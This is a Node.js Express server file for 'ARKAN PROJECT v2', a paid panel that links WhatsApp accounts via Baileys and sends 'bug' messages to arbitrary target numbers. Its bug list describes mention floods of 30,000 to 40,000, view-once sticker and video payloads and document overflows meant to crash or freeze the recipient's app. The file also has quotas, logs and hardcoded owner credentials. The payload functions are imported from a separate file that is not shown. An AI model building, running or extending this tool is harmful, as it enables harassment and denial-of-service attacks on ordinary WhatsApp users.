// lang: JavaScript, file: index.js, target: Node.js 18+, Mac/Linux
// ARKAN PROJECT v2 — Backend + Baileys + Real Bug Functions

const express = require('express')
const cors = require('cors')
const fs = require('fs-extra')
const path = require('path')
const { default: makeWASocket, DisconnectReason, useMultiFileAuthState } = require('@whiskeysockets/baileys')
const pino = require('pino')
const { bulldozer, vampireBlank, protocolbug3, protocolbug5 } = require('./bugs')

const app = express()
const PORT = process.env.PORT || 3000

app.use(cors())
app.use(express.json())
app.use(express.static(path.join(__dirname, 'public')))

// ── DB ────────────────────────────────────────────────────────────────────
const DB_PATH = path.join(__dirname, 'db')
fs.ensureDirSync(DB_PATH)

const db = {
  read: (file) => { try { return fs.readJsonSync(path.join(DB_PATH, file + '.json')) } catch { return {} } },
  write: (file, data) => { fs.writeJsonSync(path.join(DB_PATH, file + '.json'), data, { spaces: 2 }) }
}

if (!db.read('users').list) db.write('users', {
  list: [{ username: 'owner', password: 'arkan123', role: 'owner', key: 'ARKAN-OWNER-KEY', quota: 999999, active: true }]
})
if (!db.read('logs').list) db.write('logs', { list: [] })

// ── GUARDS ────────────────────────────────────────────────────────────────
function ownerGuard(req, res, next) {
  const key = req.query.key || req.body.key
  const u = db.read('users').list.find(u => u.key === key && u.role === 'owner')
  if (!u) return res.json({ status: false, msg: 'Akses ditolak. Owner only.' })
  req.user = u; next()
}
function authGuard(req, res, next) {
  const key = req.query.key || req.body.key
  const u = db.read('users').list.find(u => u.key === key && u.active)
  if (!u) return res.json({ status: false, msg: 'Key tidak valid.' })
  req.user = u; next()
}

// ── AUTH ──────────────────────────────────────────────────────────────────
app.post('/api/auth/login', (req, res) => {
  const { username, password } = req.body
  if (!username || !password) return res.json({ status: false, msg: 'Username & password wajib diisi.' })
  const u = db.read('users').list.find(u => u.username === username && u.password === password)
  if (!u) return res.json({ status: false, msg: 'Username atau password salah.' })
  if (!u.active) return res.json({ status: false, msg: 'Akun dinonaktifkan.' })
  res.json({ status: true, data: { username: u.username, role: u.role, key: u.key, quota: u.quota } })
})

app.get('/api/auth/validate', (req, res) => {
  const u = db.read('users').list.find(u => u.key === req.query.key && u.active)
  if (!u) return res.json({ status: false, msg: 'Key tidak valid.' })
  res.json({ status: true, data: { username: u.username, role: u.role, quota: u.quota } })
})

// ── USER MANAGEMENT ───────────────────────────────────────────────────────
app.get('/api/user/listUsers', ownerGuard, (req, res) => {
  const users = db.read('users')
  res.json({ status: true, data: users.list.map(u => ({ username: u.username, role: u.role, quota: u.quota, active: u.active })) })
})

app.post('/api/user/createAccount', ownerGuard, (req, res) => {
  const { username, password, role = 'user', quota = 100 } = req.body
  if (!username || !password) return res.json({ status: false, msg: 'Username & password wajib.' })
  const users = db.read('users')
  if (users.list.find(u => u.username === username)) return res.json({ status: false, msg: 'Username sudah ada.' })
  const key = 'ARKAN-' + Math.random().toString(36).substring(2, 10).toUpperCase()
  users.list.push({ username, password, role, key, quota: parseInt(quota), active: true })
  db.write('users', users)
  res.json({ status: true, msg: 'Akun berhasil dibuat.', data: { username, key } })
})

app.post('/api/user/deleteUser', ownerGuard, (req, res) => {
  const users = db.read('users')
  const idx = users.list.findIndex(u => u.username === req.body.username && u.role !== 'owner')
  if (idx === -1) return res.json({ status: false, msg: 'User tidak ditemukan.' })
  users.list.splice(idx, 1)
  db.write('users', users)
  res.json({ status: true, msg: 'User dihapus.' })
})

app.post('/api/user/editUser', ownerGuard, (req, res) => {
  const { username, quota, active } = req.body
  const users = db.read('users')
  const u = users.list.find(u => u.username === username)
  if (!u) return res.json({ status: false, msg: 'User tidak ditemukan.' })
  if (quota !== undefined) u.quota = parseInt(quota)
  if (active !== undefined) u.active = active
  db.write('users', users)
  res.json({ status: true, msg: 'User diupdate.' })
})

// ── WA SESSION ───────────────────────────────────────────────────────────
const sessions = {}

app.post('/api/whatsapp/getPairing', authGuard, async (req, res) => {
  const { number } = req.body
  const key = req.user.key
  if (!number) return res.json({ status: false, msg: 'Nomor wajib diisi.' })

  try {
    const sessionDir = path.join(DB_PATH, 'sessions', key)
    await fs.ensureDir(sessionDir)
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)

    const sock = makeWASocket({
      logger: pino({ level: 'silent' }),
      printQRInTerminal: false,
      auth: state,
      browser: ['Ubuntu', 'Chrome', '20.0.04'],
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
    })

    sock.ev.on('creds.update', saveCreds)
    sock.ev.on('connection.update', ({ connection, lastDisconnect }) => {
      if (connection === 'open') {
        sessions[key].connected = true
        console.log(`[${key}] WA Connected: ${sock.user?.id}`)
      }
      if (connection === 'close') {
        sessions[key] = { sock: null, connected: false }
      }
    })

    sessions[key] = { sock, saveCreds, connected: false }

    if (!sock.authState.creds.registered) {
      const code = await sock.requestPairingCode(number.replace(/[^0-9]/g, ''))
      return res.json({ status: true, msg: 'Kode pairing berhasil.', data: { code } })
    }

    res.json({ status: true, msg: 'Session sudah aktif.', data: { connected: true } })
  } catch (err) {
    res.json({ status: false, msg: 'Gagal: ' + err.message })
  }
})

app.get('/api/whatsapp/mySender', authGuard, (req, res) => {
  const sess = sessions[req.user.key]
  if (!sess?.sock?.user) return res.json({ status: false, msg: 'Session belum aktif.' })
  res.json({ status: true, data: { number: sess.sock.user.id.split(':')[0], name: sess.sock.user.name } })
})

// ── BUG SENDER ────────────────────────────────────────────────────────────
app.get('/api/whatsapp/getBugs', authGuard, (req, res) => {
  res.json({ status: true, data: [
    { id: 'bulldozer',    name: 'Bulldozer',      desc: 'Sticker viewOnce + 40k mention flood' },
    { id: 'vampire',     name: 'Vampire Blank',   desc: 'Interactive doc overflow + 30k mention' },
    { id: 'protocol3',   name: 'Protocol Bug 3',  desc: 'Video viewOnce + status relay + protocol25' },
    { id: 'protocol5',   name: 'Protocol Bug 5',  desc: 'Video + embedded music overflow + 40k mention' },
  ]})
})

app.post('/api/whatsapp/sendBug', authGuard, async (req, res) => {
  const { target, type = 'bulldozer', count = 1 } = req.body
  const key = req.user.key

  if (!target) return res.json({ status: false, msg: 'Target wajib diisi.' })

  const sess = sessions[key]
  if (!sess?.sock?.user) return res.json({ status: false, msg: 'Session belum aktif. Connect WA dulu.' })

  const users = db.read('users')
  const user = users.list.find(u => u.key === key)
  if (user.quota <= 0) return res.json({ status: false, msg: 'Quota habis.' })

  const jid = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  const gulbat = sess.sock
  const sendCount = Math.min(parseInt(count) || 1, 20)
  let sent = 0

  try {
    for (let i = 0; i < sendCount; i++) {
      if (type === 'bulldozer')  await bulldozer(gulbat, jid)
      else if (type === 'vampire')   await vampireBlank(gulbat, jid, true)
      else if (type === 'protocol3') await protocolbug3(gulbat, jid, true)
      else if (type === 'protocol5') await protocolbug5(gulbat, jid, true)
      sent++
      await new Promise(r => setTimeout(r, 500))
    }

    user.quota -= sent
    db.write('users', users)

    const logs = db.read('logs')
    logs.list.unshift({ time: new Date().toISOString(), user: user.username, target, type, sent })
    if (logs.list.length > 500) logs.list = logs.list.slice(0, 500)
    db.write('logs', logs)

    res.json({ status: true, msg: `Berhasil kirim ${sent}x ${type} ke ${target}.`, data: { sent, quota_left: user.quota } })
  } catch (err) {
    res.json({ status: false, msg: 'Gagal: ' + err.message })
  }
})

// ── LOGS & STATS ──────────────────────────────────────────────────────────
app.get('/api/logs', ownerGuard, (req, res) => {
  res.json({ status: true, data: db.read('logs').list.slice(0, 100) })
})

app.get('/api/whatsapp/globalLimit', ownerGuard, (req, res) => {
  const users = db.read('users')
  res.json({ status: true, data: { total_quota: users.list.reduce((a, u) => a + (u.quota || 0), 0), total_users: users.list.length } })
})

app.get('/ping', (req, res) => {
  res.json({ status: true, msg: 'ARKAN PROJECT — Online', time: new Date().toISOString() })
})

app.listen(PORT, () => {
  console.log(`\n⚡ ARKAN PROJECT v2 — port ${PORT}`)
  console.log(`   Login  : owner / arkan123`)
  console.log(`   Key    : ARKAN-OWNER-KEY`)
  console.log(`   Panel  : http://localhost:${PORT}\n`)
})
